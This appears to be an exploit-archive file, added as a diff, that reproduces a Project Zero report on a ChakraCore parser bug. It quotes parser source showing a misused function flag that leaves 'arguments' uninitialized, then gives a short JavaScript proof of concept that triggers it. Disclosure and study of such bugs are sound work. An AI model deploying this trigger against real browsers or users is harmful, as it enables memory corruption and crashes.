@@ -1,0 +1,49 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1297
+
+Here's a snippet of "ParseVariableDeclaration" which is used for parsing declarations.
+template<bool buildAST>
+ParseNodePtr Parser::ParseVariableDeclaration(
+    tokens declarationType, charcount_t ichMin,
+    BOOL fAllowIn/* = TRUE*/,
+    BOOL* pfForInOk/* = nullptr*/,
+    BOOL singleDefOnly/* = FALSE*/,
+    BOOL allowInit/* = TRUE*/,
+    BOOL isTopVarParse/* = TRUE*/,
+    BOOL isFor/* = FALSE*/,
+    BOOL* nativeForOk /*= nullptr*/)
+{
+    ...
+    if (pid == wellKnownPropertyPids.arguments && m_currentNodeFunc)
+    {
+        // This var declaration may change the way an 'arguments' identifier in the function is resolved
+        if (declarationType == tkVAR)
+        {
+            m_currentNodeFunc->grfpn |= PNodeFlags::fpnArguments_varDeclaration;
+        }
+        else
+        {
+            if (GetCurrentBlockInfo()->pnodeBlock->sxBlock.blockType == Function)
+            {
+                // Only override arguments if we are at the function block level.
+                m_currentNodeFunc->grfpn |= PNodeFlags::fpnArguments_overriddenByDecl;
+            }
+        }
+    }
+    ...
+}
+
+"m_currentNodeFunc" is only replaced when "buildAST" is true. So I think it's not supposed to use "m_currentNodeFunc" when "buildAST" is false. But the above code is using it regardless of "buildAST". So it may change a wrong function's "grfpn" flag. What I noticed is the "PNodeFlags::fpnArguments_overriddenByDecl" flag which makes the function's arguments uninitialized.
+
+PoC:
+-->
+
+function f() {
+    ({a = () => {
+        let arguments;
+    }} = 1);
+
+    arguments.x;
+}
+
+f();
